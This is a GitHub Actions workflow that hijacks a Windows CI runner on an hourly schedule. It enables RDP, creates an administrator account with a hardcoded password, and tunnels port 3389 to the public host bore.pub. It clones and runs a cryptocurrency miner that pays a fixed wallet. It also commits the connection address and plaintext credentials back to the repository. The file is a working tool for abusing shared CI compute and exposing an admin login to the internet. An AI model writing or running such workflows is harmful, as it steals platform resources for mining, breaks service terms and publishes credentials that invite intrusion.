name: RDP by DucThang x TrueHieu (Cortex Optimized Edition)

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */1 * * *" # Triggers a fresh session every hour

concurrency:
  group: vps-bore-runner
  cancel-in-progress: true # Cancels old sessions to free up RAM/CPU

jobs:
  build:
    runs-on: windows-latest
    permissions:
      contents: write # Allows pushing rdp_info.txt back to the repository
    timeout-minutes: 360 

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
          persist-credentials: true

      - name: Setup Node.js v20 (Required for Cortex Miner)
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Download and Extract Bore Tunnel
        run: |
          Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile bore.zip
          Expand-Archive bore.zip -DestinationPath bore

      - name: Enable RDP + Create Admin User
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          $pass = ConvertTo-SecureString "WindowsRDP2026@" -AsPlainText -Force
          if (-not (Get-LocalUser -Name "admin" -ErrorAction SilentlyContinue)) {
              New-LocalUser "admin" -Password $pass -FullName "admin"
              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "admin"
              Add-LocalGroupMember -Group "Administrators" -Member "admin"
          }

      - name: Clone and Setup Cortex Core Node Miner
        shell: pwsh
        run: |
          if (Test-Path "cortex-protocol") { Remove-Item "cortex-protocol" -Recurse -Force }
          git clone https://github.com/cortex-protocol/cortex-protocol.git
          cd cortex-protocol
          npm install
          npm run build

      - name: Optimize Graphics RDP Registry
        run: |
          $tsPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
          if (!(Test-Path $tsPath)) { New-Item -Path $tsPath -Force }
          Set-ItemProperty -Path $tsPath -Name "fEnableVirtualizedGraphics" -Value 1 -Type DWord
          Set-ItemProperty -Path $tsPath -Name "MinFrameRate" -Value 120 -Type DWord

      - name: Run Background Node.js Miner + Monitor Bore & Sync Git
        shell: pwsh
        run: |
          $PASS = "WindowsRDP2026@"
          $USER = "admin"
          $lastFullAddress = ""
          
          # Git Identity Configuration
          git config --global user.name "TrueHieu-Bot"
          git config --global user.email "bot@trueteam.top"
          git config --global core.autocrlf false
          $currentDir = (Get-Location).Path
          git config --global --add safe.directory $currentDir
          
          # --- LAUNCH CORE NODE.JS MINER USING ENVIRONMENT VARIABLES ---
          Write-Host "⛏️ Launching official Cortex RandomX Pool Miner..."
          $minerPath = "$currentDir\cortex-protocol"
          $minerPsi = New-Object System.Diagnostics.ProcessStartInfo
          $minerPsi.FileName = "cmd.exe"
          # Runs Pool Mining with exactly 1 Thread targeted to your address
          $minerPsi.Arguments = "/c SET MINER_ADDRESS=ctx1bde9419a13d673b57163d14ef29f3ed01843188137b28669 && SET MINING_MODE=POOL && SET MINER_THREADS=1 && SET NODE_URL=https://cortex-protocol.xyz && npm run miner"
          $minerPsi.WorkingDirectory = $minerPath
          $minerPsi.UseShellExecute = $false
          $minerProc = [System.Diagnostics.Process]::Start($minerPsi)
          
          # --- LAUNCH BORE TUNNEL ---
          Write-Host "🚀 Starting Bore Tunnel..."
          $psi = New-Object System.Diagnostics.ProcessStartInfo
          $psi.FileName = ".\bore\bore.exe"
          $psi.Arguments = "local 3389 --to bore.pub"
          $psi.UseShellExecute = $false
          $psi.RedirectStandardOutput = $true
          $process = [System.Diagnostics.Process]::Start($psi)
          
          # Keep Action Alive & Track Dynamic RDP Address Connection
          while (!$process.HasExited) {
              $line = $process.StandardOutput.ReadLine()
              if ($line) { 
                  Write-Host "[bore] $line" 
                  
                  if ($line -match "(?:listening at|remote forwarding at) (bore\.pub:\d+)") {
                      $fullAddress = $Matches[1]
                      if ($fullAddress -ne $lastFullAddress) {
                          $lastFullAddress = $fullAddress
                          $createdAt = (Get-Date).ToString('HH:mm:ss dd/MM/yyyy')
                          
                          $report = @(
                              "=======================================================",
                              "RDP INFO - DucThang x TrueHieu Edition",
                              "=======================================================",
                              "Connection Address: $fullAddress",
                              "Username: $USER",
                              "Password: $PASS",
                              "Created At: $createdAt",
                              "======================================================="
                          ) -join "`r`n"
                          
                          [System.IO.File]::WriteAllText("rdp_info.txt", $report)
                          Write-Host "🔄 New connection endpoint discovered: $fullAddress. Syncing repository..."
                          
                          try {
                              git add rdp_info.txt
                              git commit -m "Bot: Updated RDP Endpoint [$fullAddress] at $createdAt"
                              git pull --rebase origin main
                              git push origin main
                              Write-Host "🚀 [Git Push] rdp_info.txt synced successfully!"
                          } catch {
                              Write-Warning "⚠️ [Git Push] Temporary sync friction; retrying on next cycle stream."
                          }
                      }
                  }
              }
          }
